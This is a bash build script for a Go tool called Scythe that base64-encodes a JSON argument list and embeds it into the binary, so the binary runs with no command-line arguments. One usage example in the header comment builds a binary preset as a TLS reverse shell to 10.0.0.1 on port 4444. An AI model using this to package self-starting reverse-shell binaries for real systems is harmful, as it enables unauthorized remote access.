#!/usr/bin/env bash
# Build Scythe with subcommand and flags baked in. The resulting binary needs no CLI arguments:
#   ./Scythe-embedded
#
# Usage:
#   ./scripts/build-embedded.sh '["SUBCOMMAND","-flag","value",...]' [output-path]
#
# Examples:
#   ./scripts/build-embedded.sh '["Http","-url","https://example.com/api","-timeout","30s"]'
#   ./scripts/build-embedded.sh '["Netcat","-reverse","-address","10.0.0.1","-port","4444","-tls"]' ./nc.bin
#
set -euo pipefail

if [[ $# -lt 1 ]]; then
	echo "Usage: $0 'JSON_ARRAY_OF_ARGS' [output-binary]" >&2
	echo "Example: $0 '[\"Http\",\"-url\",\"https://x\",\"-timeout\",\"10s\"]' ./Scythe.embedded" >&2
	exit 1
fi

JSON="$1"
OUT="${2:-./Scythe.embedded}"
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
B64="$(printf '%s' "$JSON" | base64 | tr -d '\n')"

cd "$ROOT"
go build -trimpath \
	-ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
	-o "$OUT" ./cmd

echo "Built ${OUT} (embedded argv from JSON; run with no args to use it)"
